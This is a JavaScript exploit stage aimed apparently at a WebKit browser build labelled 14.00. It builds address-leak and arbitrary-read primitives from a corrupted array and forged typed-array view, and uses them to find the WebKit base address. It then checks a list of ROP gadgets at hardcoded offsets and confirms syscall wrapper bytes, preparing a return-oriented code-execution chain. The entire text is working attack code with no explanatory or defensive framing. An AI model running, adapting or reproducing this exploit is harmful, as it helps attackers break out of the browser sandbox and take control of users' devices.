// Derive a current-process WebKit base from the live Math.expm1 metadata,
// Recheck the current module anchor, historical 14.00 gadget bytes,
// two import pointers, and the observed number-20 wrapper without calling it.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
var slot = -1;
var original = [];
var viewChanged = false;
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || !state.ownedTypedView ||
      !state.otherTypedView || state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_views_preflight_failed");
  var forged = state.view;
  var a = state.ownedTypedView;
  var b = state.otherTypedView;
  if (a.length !== 65536 || b.length !== 65536 ||
      a[0] !== 0x31 || a[7] !== 0xa8 || b[0] !== 0x42)
    throw new Error("owned_canary_mismatch");
  function matches(at, value) {
    return forged[at] === (value & 255) &&
      forged[at + 1] === (value >>> 8 & 255) &&
      forged[at + 2] === (value >>> 16 & 255) &&
      forged[at + 3] === (value >>> 24 & 255);
  }
  function bytesAt(at) {
    var bytes = [];
    for (var n = 0; n < 8; n++) bytes.push(forged[at + n]);
    return bytes;
  }
  function hexLE(bytes) {
    var out = "0x";
    for (var n = bytes.length - 1; n >= 0; n--)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function hexForward(bytes) {
    var out = "";
    for (var n = 0; n < bytes.length; n++)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function wordOf(value) {
    var bytes = [];
    try {
      state.array[0] = value;
      for (var n = 0; n < 8; n++) bytes.push(forged[state.index + n]);
    } finally {
      state.array[0] = state.a;
    }
    return hexLE(bytes);
  }
  var anchorWord = wordOf(state.addressAnchor);
  var candidates = [];
  for (var i = 2097152; i + 3 < 4194304; i++)
    if (matches(i, 0x11223344)) {
      if (candidates.length === 32) throw new Error("anchor_candidates_capped");
      candidates.push(i);
    }
  var live = [];
  try {
    state.addressAnchor.marker = 0x55667788;
    for (var c = 0; c < candidates.length; c++)
      if (matches(candidates[c], 0x55667788)) live.push(candidates[c]);
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (live.length !== 1 || !matches(live[0], 0x11223344))
    throw new Error("anchor_live_count_" + live.length);
  var base = Number(anchorWord) + 8 - live[0];
  if (!Number.isSafeInteger(base) || base % 4096 !== 0)
    throw new Error("view_base_not_page_aligned");
  phase = "pointer_gate";
  var aWord = wordOf(a);
  var aIndex = Number(aWord) - base;
  var expWord = wordOf(Math.expm1);
  var expIndex = Number(expWord) - base;
  if (!Number.isSafeInteger(aIndex) || !Number.isSafeInteger(expIndex) ||
      aIndex < 0 || expIndex < 0 ||
      aIndex + 15 >= 16777216 || expIndex + 23 >= 4194304)
    throw new Error("cells_outside_window");
  slot = aIndex + 8;
  original = bytesAt(slot);
  var bIndex = Number(wordOf(b)) - base;
  if (!Number.isSafeInteger(bIndex) || bIndex < 0 ||
      bIndex + 15 >= 16777216)
    throw new Error("other_cell_outside_window");
  var otherData = bytesAt(bIndex + 8);
  if (Number(hexLE(otherData)) - Number(hexLE(original)) !== 65536)
    throw new Error("owned_data_spacing_mismatch");
  function readAddress(address, count) {
    if (!Number.isSafeInteger(address) || address <= 0 ||
        count < 1 || count > 64)
      throw new Error("invalid_read_target");
    var pointerBytes = [];
    for (var n = 0; n < 8; n++)
      pointerBytes.push(Math.floor(address / Math.pow(2, n * 8)) & 255);
    var bytes = [];
    viewChanged = true;
    try {
      for (var w = 0; w < 8; w++) forged[slot + w] = pointerBytes[w];
      for (var r = 0; r < count; r++) bytes.push(a[r]);
    } finally {
      for (var x = 0; x < 8; x++) forged[slot + x] = original[x];
      viewChanged = false;
    }
    return bytes;
  }
  var metadataPointer = Number(hexLE(bytesAt(expIndex + 16)));
  if (!Number.isSafeInteger(metadataPointer) || metadataPointer <= 0 ||
      metadataPointer >= base || metadataPointer % 8 !== 0)
    throw new Error("metadata_pointer_gate_failed");
  if (api && typeof api.markSync === "function")
    api.markSync("gadget_metadata_before_read");
  phase = "metadata";
  var metadata = readAddress(metadataPointer, 64);
  var codePtr = 0;
  for (var k = 7; k >= 0; k--)
    codePtr = codePtr * 256 + metadata[40 + k];
  var webkitBase = codePtr - 0x2586880;
  if (!Number.isSafeInteger(codePtr) || codePtr < 0x800000000 ||
      !Number.isSafeInteger(webkitBase) || webkitBase <= 0 ||
      webkitBase % 0x4000 !== 0)
    throw new Error("webkit_base_candidate_gate_failed");
  if (api && typeof api.markSync === "function")
    api.markSync("gadget_candidate_base_ready");
  phase = "gadget_reads";
  var specs = [
    ["G0", 0x295f948, "488b7e30488b07ff10"],
    ["G1", 0x1d989e3, "58488b07ff6018"],
    ["G2", 0x25bae0, "554889e5488b07ff5010"],
    ["G3", 0x4a0406, "488b7808488b07ff5020"],
    ["G4", 0x1ec3ada, "488b5038488b07ff5010"],
    ["G5", 0x2abccaa, "525cc3"],
    ["POP_RCX", 0x1bade, "59c3"],
    ["POP_RAX", 0x10504, "58c3"],
    ["POP_R8", 0x9b311, "?58c3"],
    ["POP_R9", 0x1dcfb1, "?59c3"],
    ["LEAVE", 0x182f7, "c9c3"],
    ["STORE_RAX", 0x548b, "488907c3"],
    ["POP_RDI", 0x5c480, "5fc3"],
    ["POP_RSI", 0x6e45e, "5ec3"],
    ["POP_RDX", 0x12c5ba, "5ac3"]
  ];
  var groups = [[], [], []];
  var matched = 0;
  var stable = true;
  for (var s = 0; s < specs.length; s++) {
    var spec = specs[s];
    var first = hexForward(readAddress(webkitBase + spec[1], spec[2].length / 2));
    var second = hexForward(readAddress(webkitBase + spec[1], spec[2].length / 2));
    if (first !== second) stable = false;
    var expected = spec[2];
    var ok = expected[0] === "?" ?
      parseInt(first.slice(0, 2), 16) >= 0x41 &&
      parseInt(first.slice(0, 2), 16) <= 0x4f &&
      first.slice(2) === expected.slice(1) : first === expected;
    if (ok) matched++;
    groups[s < 6 ? 0 : s < 12 ? 1 : 2].push(spec[0] + ":" + first);
  }
  var allMatched = matched === specs.length;
  if (!allMatched || !stable)
    throw new Error("current_process_gadget_gate_failed_" + matched);
  phase = "import_slots";
  var firstImportBytes = readAddress(webkitBase + 0x3cb8cc8, 8);
  var secondImportBytes = readAddress(webkitBase + 0x3cb9c00, 8);
  var firstImport = Number(hexLE(firstImportBytes));
  var secondImport = Number(hexLE(secondImportBytes));
  if (!Number.isSafeInteger(firstImport) ||
      !Number.isSafeInteger(secondImport) ||
      firstImport < 0x800000000 || firstImport >= 0x900000000 ||
      secondImport < 0x800000000 || secondImport >= 0x900000000 ||
      firstImport - secondImport !== 0x49a0)
    throw new Error("current_import_pair_gate_failed");
  phase = "import_targets";
  var firstCode = hexForward(readAddress(firstImport, 16));
  var firstCodeAgain = hexForward(readAddress(firstImport, 16));
  var secondCode = hexForward(readAddress(secondImport, 16));
  var secondCodeAgain = hexForward(readAddress(secondImport, 16));
  var importCodeMatched = firstCode === firstCodeAgain &&
    secondCode === secondCodeAgain &&
    firstCode.slice(0, 14) === "554889e5488b05" &&
    secondCode.slice(0, 16) === "554889e54531c0e8";
  if (!importCodeMatched)
    throw new Error("current_import_code_gate_failed");
  phase = "wrapper_bytes";
  var wrapper456 = hexForward(readAddress(firstImport + 0x6750, 16));
  var wrapper456Again = hexForward(readAddress(firstImport + 0x6750, 16));
  var wrapper20 = hexForward(readAddress(firstImport + 0x6cf0, 16));
  var wrapper20Again = hexForward(readAddress(firstImport + 0x6cf0, 16));
  var wrappersMatched = wrapper456 === wrapper456Again &&
    wrapper20 === wrapper20Again &&
    wrapper456 === "48c7c0c80100004989ca0f057201c348" &&
    wrapper20 === "48c7c0140000004989ca0f057201c348";
  var restored = hexLE(bytesAt(slot)) === hexLE(original) &&
    a[0] === 0x31 && a[7] === 0xa8 && b[0] === 0x42 &&
    state.array[0] === state.a;
  if (api && typeof api.markSync === "function")
    api.markSync("gadget_reads_restored");
  result = { id: "import_wrapper_preflight_v2",
    status: allMatched && stable && importCodeMatched &&
      wrappersMatched && restored ? "pass" : "fail",
    details: { view_base: "0x" + base.toString(16),
      webkit_base: "0x" + webkitBase.toString(16),
      matched_count: matched,
      first_import: "0x" + firstImport.toString(16),
      second_import: "0x" + secondImport.toString(16),
      import_code_matched: importCodeMatched,
      wrapper456: wrapper456, wrapper20: wrapper20,
      wrappers_matched: wrappersMatched,
      view_restored: restored } };
} catch (error) {
  if (viewChanged && state && state.view && original.length === 8 && slot >= 0)
    for (var y = 0; y < 8; y++) state.view[slot + y] = original[y];
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "import_wrapper_preflight_v2", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
